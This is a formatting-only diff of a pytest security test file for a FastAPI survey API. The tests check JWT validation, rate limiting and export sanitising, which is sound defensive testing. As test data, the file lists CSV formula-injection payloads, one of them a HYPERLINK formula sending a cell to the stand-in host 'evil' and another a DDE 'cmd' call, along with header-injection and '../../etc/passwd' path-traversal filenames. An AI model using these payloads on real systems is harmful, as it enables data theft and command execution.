@@ -14,14 +14,14 @@ from fastapi import HTTPException
 from fastapi.testclient import TestClient
 
 sys.path.insert(0, str(Path(__file__).parents[2] / "engine" / "tests"))
-from test_api import SECRET, make_settings, project_json, token  # noqa: E402
+from test_api import SECRET, make_settings, project_json, token
 
-from atsurvey import ControlPoint, Observation, ProjectInput, Setup  # noqa: E402
-from atsurvey.exports.sanitize import safe_text  # noqa: E402
-from atsurvey_api import auth  # noqa: E402
-from atsurvey_api.config import Settings, get_settings  # noqa: E402
-from atsurvey_api.main import app  # noqa: E402
-from atsurvey_api.security import RateLimiter, TokenBucketLimiter, run_guarded  # noqa: E402
+from atsurvey import ControlPoint, Observation, ProjectInput, Setup
+from atsurvey.exports.sanitize import safe_text
+from atsurvey_api import auth
+from atsurvey_api.config import Settings, get_settings
+from atsurvey_api.main import app
+from atsurvey_api.security import RateLimiter, TokenBucketLimiter, run_guarded
 
 
 @pytest.fixture
@@ -60,14 +60,18 @@ def test_unhandled_errors_do_not_leak():
         assert r.json() == {"detail": "Internal error"}
         assert "secret" not in r.text
     finally:
-        app.router.routes = [rt for rt in app.router.routes if getattr(rt, "path", "") != "/v1/__boom"]
+        app.router.routes = [
+            rt for rt in app.router.routes if getattr(rt, "path", "") != "/v1/__boom"
+        ]
 
 
 # ------------------------------------------------------------------------------- JWT
 
 
 def test_token_errors_are_generic(client):
-    bad = jwt.encode({"sub": "x", "aud": "authenticated"}, "wrong-secret-0123456789abcdefgh", "HS256")
+    bad = jwt.encode(
+        {"sub": "x", "aud": "authenticated"}, "wrong-secret-0123456789abcdefgh", "HS256"
+    )
     r = client.post("/v1/compute", json=project_json(), headers=bearer(bad))
     assert r.status_code == 401
     assert r.json()["detail"] == "Invalid or expired token"
@@ -97,8 +101,12 @@ def test_claims_are_enforced(client, claims):
 
 def test_alg_none_rejected(client):
     tok = jwt.encode(
-        {"sub": "u", "aud": "authenticated", "iss": "http://supabase.invalid/auth/v1",
-         "exp": time.time() + 600},
+        {
+            "sub": "u",
+            "aud": "authenticated",
+            "iss": "http://supabase.invalid/auth/v1",
+            "exp": time.time() + 600,
+        },
         None,
         algorithm="none",
     )
@@ -109,7 +117,8 @@ def test_hs256_rejected_in_jwks_mode():
     """Algorithm confusion: in JWKS mode an HMAC token must be refused before any key fetch."""
     s = Settings(supabase_url="https://example.supabase.co")
     tok = jwt.encode(
-        {"sub": "u", "aud": "authenticated", "exp": time.time() + 600}, "public-key-as-secret" * 3,
+        {"sub": "u", "aud": "authenticated", "exp": time.time() + 600},
+        "public-key-as-secret" * 3,
         algorithm="HS256",
     )
     with pytest.raises(HTTPException) as exc:
@@ -217,7 +226,10 @@ def test_rate_limit_returns_429_with_retry_after(client):
         r = client.post("/v1/compute", json=project_json())
         assert r.status_code == 429 and int(r.headers["retry-after"]) >= 1
         # a signed-in user has their own bucket
-        assert client.post("/v1/compute", json=project_json(), headers=bearer(token())).status_code == 200
+        assert (
+            client.post("/v1/compute", json=project_json(), headers=bearer(token())).status_code
+            == 200
+        )
         # /health is never limited
         assert client.get("/health").status_code == 200
     finally:
@@ -291,7 +303,7 @@ def test_suggest_route_enumeration_is_killed(client):
 # ------------------------------------------------------------------------------- exports
 
 
-EVIL = ["=HYPERLINK(\"http://evil/?\"&A1)", "+cmd|' /C calc'!A0", "-2+3", "@SUM(1)", "＝1+1"]
+EVIL = ['=HYPERLINK("http://evil/?"&A1)', "+cmd|' /C calc'!A0", "-2+3", "@SUM(1)", "＝1+1"]
 
 
 def _evil_project():
@@ -346,12 +358,18 @@ def test_safe_text():
     "name", ['a"; filename="evil.exe', "x\r\nSet-Cookie: a=b", "../../etc/passwd", "Αφίδνες\x00"]
 )
 def test_content_disposition_cannot_be_injected(client, name):
-    r = client.post("/v1/export", json={"format": "csv", "project_name": name, "input": project_json()})
+    r = client.post(
+        "/v1/export", json={"format": "csv", "project_name": name, "input": project_json()}
+    )
     assert r.status_code == 200
     cd = r.headers["content-disposition"]
     assert "\r" not in cd and "\n" not in cd and "set-cookie" not in {k.lower() for k in r.headers}
     plain = cd.split("filename=")[1].split(";")[0]
-    assert plain.count('"') == 2 and "/" not in plain and ".." not in plain.strip('"').split(".csv")[0][:2]
+    assert (
+        plain.count('"') == 2
+        and "/" not in plain
+        and ".." not in plain.strip('"').split(".csv")[0][:2]
+    )
 
 
 def test_typst_report_does_not_execute_user_text(client, monkeypatch):
@@ -370,5 +388,7 @@ def test_typst_report_does_not_execute_user_text(client, monkeypatch):
 
 def test_unknown_plan_formats_refused_for_anonymous(client):
     for fmt in ("xlsx", "shp", "dxf", "pdf"):
-        r = client.post("/v1/export", json={"format": fmt, "project_name": "p", "input": project_json()})
+        r = client.post(
+            "/v1/export", json={"format": fmt, "project_name": "p", "input": project_json()}
+        )
         assert r.status_code == 402
